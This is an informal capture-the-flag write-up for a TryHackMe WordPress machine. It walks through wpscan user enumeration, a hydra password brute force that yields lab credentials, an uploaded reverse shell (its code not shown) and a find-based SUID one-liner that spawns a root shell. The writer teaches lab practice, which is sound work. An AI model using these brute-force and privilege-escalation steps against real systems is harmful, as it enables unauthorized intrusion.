Hi guys todays I will start this small CTF on Tryhackme
let's start using WebMap

First we know that this is powered by wordpress

I used wpscan to enumerate the users and try to bruteforce them if I can
[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

 Now we konw that there is 3 users
when I used webmap I found one open port the 80
```
80/tcp   open  http
4512/tcp open  ssh
```

Let's try the to bruteforce using hydra
[80][http-post-form] host: 10.10.54.174   login: c0ldd   password: 9876543210 

I just login and uploaded my reverse shell and I shelled into it

then I found an SUID 
```
find . -exec /bin/sh -p \; -quit
```

And now am root
